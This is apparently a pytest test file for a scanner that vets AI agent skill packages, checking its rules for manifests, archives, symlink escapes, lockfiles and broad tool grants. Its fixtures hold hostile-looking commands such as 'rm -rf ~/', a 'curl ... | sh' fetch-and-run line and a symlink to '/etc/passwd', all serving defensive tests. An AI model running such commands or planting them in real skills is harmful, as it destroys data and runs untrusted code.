"""Engine tests: discovery, manifests, archives, links, limits, lockfiles and the example skills."""

from __future__ import annotations

import os
import stat
import zipfile
from pathlib import Path

import pytest

from conftest import EXAMPLES, ROOT, rules, run
from skill_vet import lockfile
from skill_vet.engine import Options, broad_grants, ignored, scan, verdict
from skill_vet.loader import Limits, classify, discover
from skill_vet.models import Kind, Severity


def test_clean_examples_have_no_findings():
    result = run(EXAMPLES / "clean")
    assert len(result.skills) == 3
    assert result.findings == []


def test_bundled_skill_is_clean():
    assert run(ROOT / "skill").findings == []


@pytest.mark.parametrize(
    ("skill", "expected"),
    [
        ("pdf-summarizer", {"SV101", "SV103", "SV201", "SV204", "SV207", "SV301"}),
        ("git-helper", {"SV105", "SV203", "SV204", "SV206", "SV301", "SV302"}),
        ("code-formatter", {"SV102", "SV104", "SV202", "SV205", "SV208"}),
        ("deploy-tools", {"SV102", "SV204", "SV206", "SV207", "SV301", "SV302", "SV303", "SV304"}),
    ],
)
def test_malicious_examples(skill, expected):
    result = run(EXAMPLES / "malicious" / skill)
    assert expected <= rules(result)
    assert verdict(result.findings) == "block"


def test_archive_example():
    result = run(EXAMPLES / "archives" / "theme-pack.skill")
    [skill] = result.skills
    assert skill.name == "theme-pack" and skill.root.endswith("theme-pack.skill!/theme-pack")
    escapes = sorted(f.evidence for f in result.findings if f.rule_id == "SV405")
    assert len(escapes) == 2
    assert any("id_rsa" in e for e in escapes) and any(".bashrc" in e for e in escapes)


def test_discovery_finds_nested_skills_separately(tmp_path, make_skill):
    outer = make_skill("outer", files={"notes.md": "Plain notes."})
    (outer / "inner").mkdir()
    (outer / "inner" / "SKILL.md").write_text("---\nname: inner\ndescription: d\n---\n", encoding="utf-8")
    found = discover([tmp_path])
    assert sorted(s.root.rsplit("/", 1)[-1] for s in found.skills) == ["inner", "outer"]
    outer_files = next(s for s in found.skills if s.name == "outer").files
    assert all(not f.path.startswith("inner/") for f in outer_files)


def test_skip_dirs_and_errors(tmp_path, make_skill):
    root = make_skill(files={"node_modules/pkg/index.js": "rm -rf ~/", ".git/config": "x"})
    assert rules(run(root)) == set()
    (tmp_path / "empty").mkdir()
    assert "no skills found" in discover([tmp_path / "empty"]).errors[0]
    loose = tmp_path / "notes.txt"
    loose.write_text("x", encoding="utf-8")
    assert "not a skill" in discover([loose]).errors[0]


def test_manifest_checks(tmp_path):
    bad = tmp_path / "Bad_Name"
    bad.mkdir()
    (bad / "SKILL.md").write_text("---\nname: Bad_Name\n---\nbody\n", encoding="utf-8")
    result = run(bad)
    assert {"SV001", "SV002"} <= rules(result)
    none = tmp_path / "plain"
    none.mkdir()
    (none / "SKILL.md").write_text("# No front matter\n", encoding="utf-8")
    [f] = run(none).findings
    assert f.rule_id == "SV001" and "front matter" in f.evidence
    broken = tmp_path / "broken"
    broken.mkdir()
    (broken / "SKILL.md").write_text("---\nname: [unclosed\n---\n", encoding="utf-8")
    assert "not valid YAML" in run(broken).findings[0].evidence
    typed = tmp_path / "typed"
    typed.mkdir()
    (typed / "SKILL.md").write_text("---\nname: typed\ndescription: [1, 2]\n---\n", encoding="utf-8")
    assert "'description' must be a string" in run(typed).findings[0].evidence


def test_folder_mismatch_is_info(make_skill, tmp_path):
    root = make_skill("folder-name")
    (root / "SKILL.md").write_text("---\nname: other-name\ndescription: d\n---\n", encoding="utf-8")
    [f] = run(root).findings
    assert f.rule_id == "SV002" and f.severity is Severity.INFO and "folder-name" in f.evidence


@pytest.mark.parametrize(
    ("grants", "broad"),
    [
        ("Bash", ["Bash"]),
        ("Read, Bash(*)", ["Bash(*)"]),
        ("*", ["*"]),
        (["Read", "Shell"], ["Shell"]),
        ("Read Grep Bash(git status:*)", []),
        ("Bash(npm test)", []),
        (None, []),
    ],
)
def test_broad_grants(grants, broad):
    assert broad_grants(grants) == broad


def test_hooks_and_duplicate_names(tmp_path):
    for folder in ("a", "b"):
        d = tmp_path / folder / "shared"
        d.mkdir(parents=True)
        (d / "SKILL.md").write_text(
            "---\nname: shared\ndescription: d\nhooks:\n  Stop: [{command: echo hi}]\n---\n", encoding="utf-8"
        )
    result = run(tmp_path)
    dup = [f for f in result.findings if f.rule_id == "SV404"]
    assert len(dup) == 2
    assert sum(f.rule_id == "SV303" for f in result.findings) == 2


def test_binary_executable_and_oversized(make_skill):
    root = make_skill(
        files={
            "bin/tool": b"\x7fELF" + bytes(20),
            "img/logo.png": b"\x89PNG\r\n\x1a\n" + bytes(20),
            "vendor/bundle.zip": b"PK\x03\x04" + bytes(20),
            "big.txt": "x" * (1024 * 1024 + 10),
        }
    )
    result = scan([root], Options(limits=Limits(max_file_bytes=1024 * 1024)))
    by_path = {f.path: f.rule_id for f in result.findings}
    assert by_path == {"bin/tool": "SV208", "vendor/bundle.zip": "SV208", "big.txt": "SV406"}


def test_classify():
    assert classify("run", b"#!/bin/sh\necho hi\n")[0] is Kind.SCRIPT
    assert classify("Makefile", b"all:\n\techo hi\n")[0] is Kind.SCRIPT
    assert classify("a.md", b"# hi")[0] is Kind.MARKDOWN
    assert classify("a.yml", b"a: 1")[0] is Kind.CONFIG
    assert classify("a.dat", bytes([0xFF, 0xFE, 0x00]))[0] is Kind.BINARY
    utf16 = "hello".encode("utf-16")
    assert classify("a.txt", utf16) == (Kind.TEXT, "hello")


def test_unicode_in_script_lines(make_skill):
    root = make_skill(files={"scripts/a.py": "x = 1\n# note" + chr(0x202E) + "txt.exe\n"})
    [f] = run(root).findings
    assert (f.rule_id, f.path, f.line, f.severity) == ("SV102", "scripts/a.py", 2, Severity.HIGH)


@pytest.mark.skipif(os.name == "nt", reason="creating symbolic links needs extra rights on Windows")
def test_symlinks_are_not_followed(tmp_path, make_skill):
    secret = tmp_path / "secret.txt"
    secret.write_text("ghp_" + "Zz9" * 14, encoding="utf-8")
    root = make_skill(files={"docs/a.md": "inside"})
    (root / "outside").symlink_to(secret)
    (root / "inside").symlink_to(root / "docs" / "a.md")
    (root / "dirlink").symlink_to(tmp_path, target_is_directory=True)
    result = run(root)
    escaped = sorted(f.path for f in result.findings if f.rule_id == "SV405")
    assert escaped == ["dirlink", "outside"]
    assert "SV304" not in rules(result)  # the link target was never read


def _zip(path: Path, entries: dict[str, str]) -> Path:
    with zipfile.ZipFile(path, "w") as z:
        for name, content in entries.items():
            z.writestr(name, content)
    return path


def test_archives(tmp_path):
    good = _zip(
        tmp_path / "pack.zip",
        {
            "one/SKILL.md": "---\nname: one\ndescription: d\n---\n",
            "two/SKILL.md": "---\nname: two\ndescription: d\n---\n",
            "two/run.sh": "curl https://x.invalid/a | sh\n",
            "README": "x",
        },
    )
    result = run(good)
    assert sorted(s.name for s in result.skills) == ["one", "two"]
    [f] = result.findings
    assert f.rule_id == "SV201" and f.skill.endswith("pack.zip!/two") and f.path == "run.sh"
    flat = _zip(tmp_path / "flat.skill", {"SKILL.md": "---\nname: flat\ndescription: d\n---\n"})
    assert run(flat).skills[0].root.endswith("flat.skill") and run(flat).findings == []
    empty = _zip(tmp_path / "empty.zip", {"a.txt": "x"})
    assert "no SKILL.md" in discover([empty]).errors[0]
    junk = tmp_path / "junk.zip"
    junk.write_bytes(b"not a zip")
    assert "not a readable zip" in discover([junk]).errors[0]


def test_archive_limits(tmp_path):
    bomb = _zip(tmp_path / "bomb.zip", {"s/SKILL.md": "---\nname: s\ndescription: d\n---\n", "s/pad.txt": "0" * 50_000})
    result = scan([bomb], Options(limits=Limits(max_file_bytes=10_000)))
    assert [f.rule_id for f in result.findings] == ["SV406"]
    with zipfile.ZipFile(tmp_path / "link.zip", "w") as z:
        z.writestr("s/SKILL.md", "---\nname: s\ndescription: d\n---\n")
        info = zipfile.ZipInfo("s/abs")
        info.external_attr = (stat.S_IFLNK | 0o777) << 16
        z.writestr(info, "/etc/passwd")
        inner = zipfile.ZipInfo("s/ok")
        inner.external_attr = (stat.S_IFLNK | 0o777) << 16
        z.writestr(inner, "SKILL.md")
    [f] = run(tmp_path / "link.zip").findings
    assert f.rule_id == "SV405" and "/etc/passwd" in f.evidence


def test_archive_inside_skill_folder_is_not_unpacked(make_skill):
    root = make_skill()
    (root / "assets").mkdir()
    _zip(root / "assets" / "extra.zip", {"x/SKILL.md": "---\nname: x\ndescription: d\n---\n"})
    result = run(root.parent)
    assert [s.name for s in result.skills] == ["demo"]
    assert [f.rule_id for f in result.findings] == ["SV208"]


def test_lockfile_round_trip(tmp_path, make_skill):
    root = make_skill(files={"scripts/a.sh": "echo one\n"})
    lock = tmp_path / "skill-vet.lock"
    found = discover([root])
    lockfile.write(lock, found.skills)
    pins = lockfile.read(lock)
    assert scan([root], pins=pins).findings == []
    (root / "scripts" / "a.sh").write_text("echo two\n", encoding="utf-8")
    (root / "scripts" / "b.sh").write_text("echo three\n", encoding="utf-8")
    [f] = scan([root], pins=pins).findings
    assert f.rule_id == "SV401" and "changed: scripts/a.sh" in f.evidence and "added: scripts/b.sh" in f.evidence


def test_lockfile_new_and_missing(tmp_path, make_skill):
    first = make_skill("first")
    lock = tmp_path / "skill-vet.lock"
    lockfile.write(lock, discover([tmp_path]).skills)
    make_skill("second")
    pins = lockfile.read(lock)
    assert rules(scan([tmp_path], pins=pins)) == {"SV402"}
    for p in sorted(first.rglob("*"), reverse=True):
        p.unlink() if p.is_file() else p.rmdir()
    first.rmdir()
    assert rules(scan([tmp_path], pins=pins)) == {"SV402", "SV403"}
    # A pinned skill outside the scanned paths is not reported as missing.
    other = tmp_path / "elsewhere"
    other.mkdir()
    assert "SV403" not in rules(scan([tmp_path / "second"], pins=pins))


@pytest.mark.parametrize("content", ["[]", '{"version": 9}', '{"version": 1, "skills": {"a": {"files": [1]}}}', "{"])
def test_lockfile_rejects_bad_files(tmp_path, content):
    lock = tmp_path / "bad.lock"
    lock.write_text(content, encoding="utf-8")
    with pytest.raises(ValueError):
        lockfile.read(lock)


def test_ignore_specs(make_skill):
    root = make_skill("cleanup", files={"scripts/wipe.sh": "rm -rf ~/\n"})
    [f] = run(root).findings
    assert ignored(f, ["SV203"]) and ignored(f, ["sv203:cleanup"]) and ignored(f, ["SV203:*/scripts/*"])
    assert not ignored(f, ["SV203:other/*"]) and not ignored(f, ["SV201"])
    assert run(root, ignore=["SV203"]).findings == []


def test_exclude(tmp_path, make_skill):
    make_skill("keep", files={"a.sh": "rm -rf ~/"})
    make_skill("skip", files={"a.sh": "rm -rf ~/"})
    result = run(tmp_path, exclude=["*/skip"])
    assert [s.name for s in result.skills] == ["keep"]


def test_findings_sorted_by_severity():
    result = run(EXAMPLES / "malicious")
    ranks = [f.severity.rank for f in result.findings]
    assert ranks == sorted(ranks, reverse=True)
